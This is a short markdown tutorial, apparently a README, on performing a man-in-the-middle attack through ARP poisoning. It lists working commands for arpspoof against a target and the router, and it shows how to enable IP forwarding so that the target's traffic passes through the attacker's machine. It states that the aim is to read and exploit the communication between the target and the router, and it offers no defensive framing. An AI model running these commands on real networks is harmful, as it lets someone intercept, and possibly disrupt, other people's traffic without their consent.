# MITM Attach
### Man in the middle attack

In this attack we use **ARP poisoning** attack to redirect the packets from our device

What it will do is
> It will redirect all the traffic/packets for your target device from your pc in this way we can check all the communication between the target the router in this way we can exploit it.

>```bash
>arp -a
>```
>This command will show all the ips asoociated with the mac address

## ARP Spoofing Commands
>1. Tell target you are the network router
>```bash
>arpspoof -i [interface] -t [target ip] [router ip]
>```

>2. Tell network router you are the target
>```bash
>arpspoof -i [interface] -t [router ip] [target ip] 
>```
### once this is done the target will lose it's internet connection 
For request forwarding execute command
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```
